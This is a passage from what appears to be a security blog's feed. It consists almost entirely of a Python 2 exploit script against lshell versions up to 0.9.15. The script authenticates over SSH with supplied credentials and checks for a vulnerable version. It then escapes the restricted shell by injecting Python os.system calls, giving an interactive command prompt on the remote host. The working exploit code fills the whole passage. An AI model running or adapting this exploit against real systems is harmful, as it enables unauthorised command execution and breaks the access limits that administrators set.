<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import paramiko
</span><span class='line'>import traceback
</span><span class='line'>from time import sleep
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Exploit lshell pathing vulnerability in &lt;= 0.9.15.
</span><span class='line'># Runs commands on the remote system.
</span><span class='line'># @dronesec
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>if len(sys.argv) &lt; 4:
</span><span class='line'>    print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
</span><span class='line'>    sys.exit(1)
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    print '[!] .............................'
</span><span class='line'>    print '[!] lshell &lt;= 0.9.15 remote shell.'
</span><span class='line'>    print '[!] note: you can also ssh in and execute \'/bin/bash\''
</span><span class='line'>    print '[!] .............................'
</span><span class='line'>    print '[!] Checking host %s...'%(sys.argv[3])
</span><span class='line'>    ssh = paramiko.SSHClient()
</span><span class='line'>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
</span><span class='line'>    if len(sys.argv) == 5:
</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
</span><span class='line'>    else:
</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    # verify lshell 
</span><span class='line'>    channel = ssh.invoke_shell()
</span><span class='line'>    while not channel.recv_ready(): sleep(1)
</span><span class='line'>    ret = channel.recv(2048)
</span><span class='line'>
</span><span class='line'>    channel.send('help help\n')
</span><span class='line'>    while not channel.recv_ready(): sleep(1)
</span><span class='line'>    ret = channel.recv(2048)
</span><span class='line'>
</span><span class='line'>    if not 'lshell' in ret:
</span><span class='line'>        if 'forbidden' in ret:
</span><span class='line'>            print '[-] Looks like we can\'t execute SSH commands'
</span><span class='line'>        else:
</span><span class='line'>            print '[-] Environment is not lshell'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    # verify vulnerable version
</span><span class='line'>    channel.send('sudo\n')
</span><span class='line'>    while not channel.recv_ready(): sleep(1)
</span><span class='line'>    ret = channel.recv(2048)
</span><span class='line'>    if not 'Traceback' in ret:
</span><span class='line'>        print '[-] lshell version not vulnerable.'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>    channel.close()
</span><span class='line'>    ssh.close()
</span><span class='line'>
</span><span class='line'>    # exec shell
</span><span class='line'>    print '[+] vulnerable lshell found, preparing pseudo-shell...'
</span><span class='line'>    if len(sys.argv) == 5:
</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
</span><span class='line'>    else:
</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
</span><span class='line'>
</span><span class='line'>    while True:
</span><span class='line'>        cmd = raw_input('$ ')
</span><span class='line'>
</span><span class='line'>        # breaks paramiko
</span><span class='line'>        if cmd[0] is '/':
</span><span class='line'>            print '[!] Running binaries won\'t work!'
</span><span class='line'>            continue
</span><span class='line'>
</span><span class='line'>        cmd = cmd.replace("'", r"\'")
</span><span class='line'>        cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
</span><span class='line'>        if len(cmd) &gt; 1:
</span><span class='line'>            if 'quit' in cmd or 'exit' in cmd:
</span><span class='line'>                break
</span><span class='line'>            (stdin,stdout,stderr) = ssh.exec_command(cmd)
</span><span class='line'>        out = stdout.read()
</span><span class='line'>        print out.strip()
</span><span class='line'>except paramiko.AuthenticationException:
</span><span class='line'>    print '[-] Authentication to %s failed.'%sys.argv[3]
</span><span class='line'>except Exception, e:
</span><span class='line'>    print '[-] Error: ', e
</span><span class='line'>    print type(e)
</span><span class='line'>    traceback.print_exc(file=sys.stdout)
</span><span class='line'>finally:
</span><span class='line'>    channel.close()
</span><span class='line'>    ssh.close()</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
